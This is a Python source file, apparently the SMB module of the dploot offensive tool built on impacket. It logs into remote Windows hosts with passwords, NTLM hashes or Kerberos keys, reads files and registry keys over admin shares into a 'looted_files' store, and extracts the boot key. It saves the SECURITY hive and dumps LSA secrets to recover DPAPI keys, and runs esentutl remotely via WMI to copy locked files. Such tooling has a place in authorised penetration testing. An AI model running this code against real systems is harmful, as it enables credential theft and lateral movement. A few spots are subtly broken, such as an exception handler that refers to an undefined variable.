from binascii import hexlify, unhexlify
import ntpath
import os
import logging
import time
import argparse

from typing import Any, Dict, List, Optional

from dploot.lib.network import DPLootConnection
from dploot.lib.target import Target

from impacket.dcerpc.v5 import rrp
from impacket.system_errors import ERROR_NO_MORE_ITEMS, ERROR_FILE_NOT_FOUND
from impacket.smbconnection import SMBConnection
from impacket.nmb import NetBIOSTimeout
from impacket.smb import FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_SHARE_DELETE, SMB_DIALECT
from impacket.examples.secretsdump import RemoteOperations, LSASecrets
from impacket.smb3structs import (
    FILE_READ_DATA,
    FILE_OPEN,
    FILE_NON_DIRECTORY_FILE
)

from dploot.lib.network.wmi import DPLootWmiExec

class DPLootSMBConnection(DPLootConnection):
    def __init__(self, target: Target) -> None:
        super().__init__(target)
        self.smb_session = None
        self._remote_ops = None
        self._bootkey = None

    def __create_smbv1_conn(self, kdc=""):
        try:
            self.smb_session = SMBConnection(
                kdc or self.target.address,
                kdc or self.target.address,
                None,
                preferredDialect=SMB_DIALECT,
            )
        except OSError as e:
            if str(e).find("Connection reset by peer") != -1:
                logging.debug(
                    f"SMBv1 might be disabled on {kdc or self.target.address}"
                )
            return False
        except (Exception, NetBIOSTimeout) as e:
            logging.debug(
                f"Error creating SMBv1 connection to {kdc or self.target.address}: {e}"
            )
            return False

        return True

    def __create_smbv3_conn(self, kdc=""):
        try:
            self.smb_session = SMBConnection(
                kdc or self.target.address,
                kdc or self.target.address,
                None,
            )
        except OSError as e:
            if str(e).find("Too many open files") != -1:
                logging.error(
                    f"SMBv3 connection error on {kdc or self.target.address}: {e}"
                )
            return False
        except (Exception, NetBIOSTimeout) as e:
            logging.debug(
                f"Error creating SMBv3 connection to {kdc or self.target.address}: {e}"
            )
            return False

        return True

    def __create_conn_obj(self, kdc=""):
        if self.__create_smbv3_conn(kdc) or self.__create_smbv1_conn(kdc):
            return True
        logging.debug(
            "Could not create connection object to %s"
            % (kdc or self.target.address)
        )
        return False

    def __reconnect(self) -> bool:
        if self.remote_ops is not None:
            self.remote_ops.finish()
        self.smb_session.reconnect()

    def __get_hive_to_rrphandle(self, hive:str) -> bytes:
        if hive.lower() == "hkcr":
            return rrp.hOpenClassesRoot(self.remote_ops._RemoteOperations__rrp)["phKey"]
        elif hive.lower() == "hkcu":
            return rrp.hOpenCurrentUser(self.remote_ops._RemoteOperations__rrp)["phKey"]
        elif hive.lower() == "hklm":
            return rrp.hOpenLocalMachine(self.remote_ops._RemoteOperations__rrp)["phKey"]
        elif hive.lower() == "hku":    
            return rrp.hOpenUsers(self.remote_ops._RemoteOperations__rrp)["phKey"]
        else:
            raise ValueError(f"Unknown hive {hive}")
        
    @property
    def remote_ops(self) -> RemoteOperations:
        if self._remote_ops is not None:
            return self._remote_ops
        logging.getLogger("impacket").disabled = True
        try:
            self._remote_ops = RemoteOperations(
                self.smb_session, self.target.do_kerberos, self.target.dc_ip
            )
            self._remote_ops.enableRegistry()
        except Exception as e:
            logging.error(f"RemoteOperations failed: {e}")

        return self._remote_ops
    
    @property
    def bootkey(self):
        if self._bootkey is not None:
            return self._bootkey
        self._bootkey = self.remote_ops.getBootKey()
        return self._bootkey

    # Common protocol functions

    def connect(self) -> bool:
        try:
            logging.debug("Connecting to %s through SMB" % self.target.address)
            if self.target.do_kerberos:
                # getting hostname
                if not self.__create_conn_obj():
                    return False
                try:
                    self.smb_session.login("", "")
                except Exception as e:
                    if "STATUS_NOT_SUPPORTED" in str(e):
                        logging.error("Kerberos authentication is not supported by this host. Please try to connect with NTLM.")
                        return False
                hostname = self.smb_session.getServerDNSHostName()
                self.smb_session.close()
                self.target.address = hostname
                
                if not self.__create_conn_obj(self.target.address):
                    return False
                logging.debug(
                    "Authenticating with %s through Kerberos" % self.target.username
                )
                self.smb_session.kerberosLogin(
                    user=self.target.username,
                    password=self.target.password,
                    domain=self.target.domain,
                    lmhash=self.target.lmhash,
                    nthash=self.target.nthash,
                    aesKey=self.target.aesKey,
                    kdcHost=self.target.kdcHost,
                    useCache=self.target.use_kcache,
                )
                self.target.username = self.smb_session.getCredentials()[0]
            else:
                if not self.__create_conn_obj():
                    return False
                logging.debug(
                    "Authenticating with %s through NTLM" % self.target.username
                )
                self.smb_session.login(
                    user=self.target.username,
                    password=self.target.password,
                    domain=self.target.domain,
                    lmhash=self.target.lmhash,
                    nthash=self.target.nthash,
                )
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()
                logging.debug(str(e))
            return False
        return True

    def list_dir(self, path, share:str="C$", wildcard:bool=True) -> "Any | None":
        if wildcard:
            path = ntpath.join(path, "*")
        try:
            return self.smb_session.listPath(
                shareName=share, path=ntpath.normpath(path)
            )

        except Exception:
            return None

    def is_admin(self) -> bool:
        try:
            self.smb_session.connectTree("C$")
            is_admin = True
        except Exception:
            is_admin = False
        return is_admin
    
    def read_file(
        self,
        path,
        share:str="C$",
        looted_files=None,
        offset=0,
        bypass_shared_violation=False,
    ) -> bytes:
        shareAccessMode=FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
        path = path.replace("/", "\\")
        path = ntpath.normpath(path)
        if len(path) > 0 and path[0] == "\\":
            path = path[1:]
        treeId = self.smb_session.connectTree(share)
        fileId = None

        data = None

        try:
            fileId = self.smb_session.openFile(
                treeId,
                path,
                FILE_READ_DATA,
                shareAccessMode,
                FILE_NON_DIRECTORY_FILE,
                FILE_OPEN,
                0,
            )
            fileInfo = self.smb_session.queryInfo(treeId, fileId)
            fileSize = fileInfo["EndOfFile"]
            res = self.smb_session._SMBConnection.getIOCapabilities()
            if (fileSize - offset) < res["MaxReadSize"]:
                # Skip reading 0 bytes files.
                if (fileSize - offset) > 0:
                    data = self.smb_session._SMBConnection.read(
                        treeId, fileId, offset, fileSize - offset
                    )
            else:
                written = 0
                toBeRead = fileSize - offset
                data = b""
                while written < toBeRead:
                    bytesRead = self.smb_session._SMBConnection.read(
                        treeId, fileId, offset, res["MaxReadSize"]
                    )
                    written += len(bytesRead)
                    offset += len(bytesRead)
                    data += bytesRead
        except Exception as e:
            logging.debug(f"Exception occurred while trying to read {path}: {e}")
            if "STATUS_OBJECT_PATH_NOT_FOUND" in str(e) or "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                pass
            elif bypass_shared_violation and "STATUS_SHARING_VIOLATION" in str(e):
                wmiexec = DPLootWmiExec(target=self.target)
                command = (
                    f'cmd.exe /Q /c esentutl.exe /y "C:\\{path}" /d "C:\\Windows\\Temp\\{wmiexec.output}"'
                )
                wmiexec.run(command)
                time.sleep(1)
                while True:
                    try:
                        filepath = ntpath.join("Windows\\Temp\\",wmiexec.output)
                        data = self.read_file(share=share, path=filepath)
                        break
                    except Exception as e:
                        if str(e).find("STATUS_SHARING_VIOLATION") >= 0:
                            # Output not finished, let's wait
                            time.sleep(1)
                self.smb_session.deleteFile(share, filepath)
            elif str(e).find("Broken") >= 0:
                logging.debug("Connection broken, trying to recreate it")
                self.__reconnect()
                data = self.read_file(
                    path=path,
                    share=share,
                    looted_files=looted_files,
                    offset=offset,
                    bypass_shared_violation=bypass_shared_violation,
                )
            else:
                logging.debug(str(e))
        finally:
            if fileId is not None:
                self.smb_session._SMBConnection.close(treeId, fileId)
            self.smb_session.disconnectTree(treeId)

        if looted_files is not None and data is not None and data != b"":
            looted_files[os.path.join(*(path.split("\\")))]=data
        return data
    
    def reg_enum_key(self, hive:str, path:str) -> List[str]:
        keys = []
        reg_handle = self.__get_hive_to_rrphandle(hive)

        ans = rrp.hBaseRegOpenKey(
                self.remote_ops._RemoteOperations__rrp,
                reg_handle,
                path,
                samDesired=rrp.KEY_ENUMERATE_SUB_KEYS,
            )
        key_handle = ans["phkResult"]
        i = 0
        while True:
            try:
                enum_ans = rrp.hBaseRegEnumKey(
                    self.remote_ops._RemoteOperations__rrp, key_handle, i
                )
                keys.append(enum_ans["lpNameOut"][:-1])
                i += 1
            except rrp.DCERPCSessionError as e:
                if e.get_error_code() == ERROR_NO_MORE_ITEMS:
                    break
            except Exception as e:
                import traceback

                traceback.print_exc()
                logging.error(str(e))
        rrp.hBaseRegCloseKey(self.remote_ops._RemoteOperations__rrp, key_handle)
        return keys

    def reg_enum_values(self, hive:str, keypath:str) -> List[str]:
        values_names = []
        reg_handle = self.__get_hive_to_rrphandle(hive)
        ans = rrp.hBaseRegOpenKey(
            self.remote_ops._RemoteOperations__rrp, reg_handle, keypath
        )
        i = 0
        while True:
            try:
                ans2 = rrp.hBaseRegEnumValue(
                    self.remote_ops._RemoteOperations__rrp,
                    ans["phkResult"], i)
                lp_value_name = ans2["lpValueNameOut"][:-1]
                values_names.append(lp_value_name)
                i += 1
            except rrp.DCERPCSessionError as e:
                if e.get_error_code() == ERROR_NO_MORE_ITEMS:
                    break
        return values_names

    def reg_get_key_value(self, hive:str, keypath:str, value_name:str) -> Any:
        reg_handle = self.__get_hive_to_rrphandle(hive)
        value = None
        ans = rrp.hBaseRegOpenKey(
            self.remote_ops._RemoteOperations__rrp, reg_handle, keypath
        )
        key_handle = ans["phkResult"]
        try:
            ans = rrp.hBaseRegOpenKey(
                self.remote_ops._RemoteOperations__rrp, reg_handle, keypath
            )
            key_handle = ans["phkResult"]
            _, value = rrp.hBaseRegQueryValue(
                self.remote_ops._RemoteOperations__rrp, key_handle, value_name
            )
        except rrp.DCERPCSessionError as e:
            if e.get_error_code() == ERROR_FILE_NOT_FOUND:
                logging.debug(f"Exception in SMB reg_get_key_value({hive},{keypath},{value_name}): Key not found")
            else:
                logging.debug(f"Exception in SMB reg_get_key_value({hive},{keypath},{value_name}): {e}")
        rrp.hBaseRegCloseKey(self.remote_ops._RemoteOperations__rrp, key_handle)
        return value
    
    def get_dpapi_system_keys(self, looted_files=None) -> Dict[str,bytes]:
        dpapiSystem = {}
        logging.getLogger("impacket").disabled = True
        if self.bootkey:
            logging.debug(f"Got Bootkey: {hexlify(self.bootkey)}")
            if looted_files is not None:
                # SMB secretsdump never "dumps" the SYSTEM, it just extracts the bootkey
                # but we can save it in a separate file
                looted_files["Windows/System32/config/SYSTEM_bootkey"]=self.bootkey
        try:
            SECURITYFileName = (
                self.remote_ops.saveSECURITY()
            )
        except:
            logging.error("saveSECURITY failed: %s" % str(e))
            # retrieve DPAPI keys
        def getDPAPI_SYSTEM(_, secret) -> None:
            if secret.startswith("dpapi_machinekey:"):
                machineKey, userKey = secret.split("\n")
                machineKey = machineKey.split(":")[1]
                userKey = userKey.split(":")[1]
                dpapiSystem["MachineKey"] = unhexlify(machineKey[2:])
                dpapiSystem["UserKey"] = unhexlify(userKey[2:])
        
        if looted_files is not None:
            # if you wanna loot the SECURITY, let's do it
            temp_security_file_name = SECURITYFileName._RemoteFile__fileName
            self.read_file(temp_security_file_name, share="ADMIN$", looted_files=looted_files)
            looted_files["Windows/System32/config/SECURITY"] = looted_files.pop(os.path.join(*(temp_security_file_name.split("\\"))))

        try:
            LSA = LSASecrets(
                SECURITYFileName,
                self.bootkey,
                self.remote_ops,
                isRemote=True,
                perSecretCallback=getDPAPI_SYSTEM,
            )
            LSA.dumpSecrets()
            LSA.finish()
        except Exception as e:
            logging.error("LSA hashes extraction failed: %s" % str(e))

        return dpapiSystem

class SMBTarget(Target):
    def __init__(self) -> None:
        self.domain: str = None
        self.username: str = None
        self.password: str = None
        self.address: str = None
        self.hashes: str = None
        self.lmhash: str = None
        self.nthash: str = None
        self.do_kerberos: bool = False
        self.kdcHost: str = None
        self.use_kcache: bool = False
        self.dc_ip: str = None
        self.aesKey: str = None

    @staticmethod
    def from_options(options) -> "Target":
        if options.dc_ip is None:
            options.dc_ip = options.target

        return SMBTarget.create(
            domain=options.domain,
            username=options.username if options.username is not None else "",
            password=options.password if options.password is not None else "",
            address=options.target,
            hashes=options.hashes,
            lmhash=None,
            nthash=None,
            do_kerberos=options.k or options.aesKey is not None or options.use_kcache,
            kdcHost=options.kdcHost,
            use_kcache=options.use_kcache,
            no_pass=options.no_pass,
            dc_ip=options.dc_ip,
            aesKey=options.aesKey,
        )

    @staticmethod
    def create(
        domain: Optional[str] = None,
        username: str = "",
        password: str = "",
        address: Optional[str] = None,
        hashes: Optional[str] = None,
        lmhash: str = "",
        nthash: str = "",
        do_kerberos: bool = False,
        kdcHost: Optional[str] = None,
        use_kcache: bool = False,
        no_pass: bool = False,
        dc_ip: Optional[str] = None,
        aesKey: Optional[str] = None,
    ) -> "Target":
        self = SMBTarget()
        self.protocol = "smb"

        if domain is None:
            domain = ""

        if hashes is not None:
            hashes = hashes.split(":")
            if len(hashes) == 1:
                (nthash,) = hashes
                lmhash = nthash
            else:
                lmhash, nthash = hashes
        elif lmhash is None and nthash is None:
            lmhash = nthash = ""

        if dc_ip is None:
            dc_ip = address

        self.domain = domain
        self.username = username
        self.password = password
        self.address = address
        self.lmhash = lmhash
        self.nthash = nthash
        self.do_kerberos = do_kerberos or aesKey is not None or use_kcache
        self.kdcHost = kdcHost
        self.use_kcache = use_kcache
        self.dc_ip = dc_ip
        self.aesKey = aesKey

        return self

    @staticmethod
    def add_network_argument_group(
    parser: argparse.ArgumentParser,
) -> None:
        group = parser.add_argument_group("smb authentication")
        group.add_argument(
            "-t",
            "--target",
            action="store",
            dest="target",
            metavar="<target name or address>",
            help="Target ip or address",
        )

        group.add_argument(
            "-d",
            "--domain",
            metavar="domain.local",
            dest="domain",
            action="store",
            help="Domain name",
        )

        group.add_argument(
            "-u",
            "--username",
            metavar="username",
            dest="username",
            action="store",
            help="Username",
        )

        group.add_argument(
            "-p",
            "--password",
            metavar="password",
            dest="password",
            action="store",
            help="Password",
        )

        group.add_argument(
            "--hashes",
            action="store",
            metavar="LMHASH:NTHASH",
            help="NTLM hashes, format is LMHASH:NTHASH",
        )
        group.add_argument(
            "--no-pass", action="store_true", help="don't ask for password (useful for -k)"
        )
        group.add_argument("-k", action="store_true", help="Use Kerberos authentication")
        group.add_argument(
            "--aesKey",
            action="store",
            metavar="hex key",
            help="AES key to use for Kerberos Authentication (128 or 256 bits)",
        )
        group.add_argument(
            "--use-kcache",
            action="store_true",
            help="Use Kerberos authentication from ccache file (KRB5CCNAME)",
        )
        group.add_argument(
            "--kdcHost",
            help="FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter",
        )
        group.add_argument(
            "--dc-ip",
            action="store",
            metavar="ip address",
            help=(
                "IP Address of the domain controller. If omitted it will use the domain "
                "part (FQDN) specified in the target parameter"
            ),
        )

    def create_connection_object(self):
        return DPLootSMBConnection(self)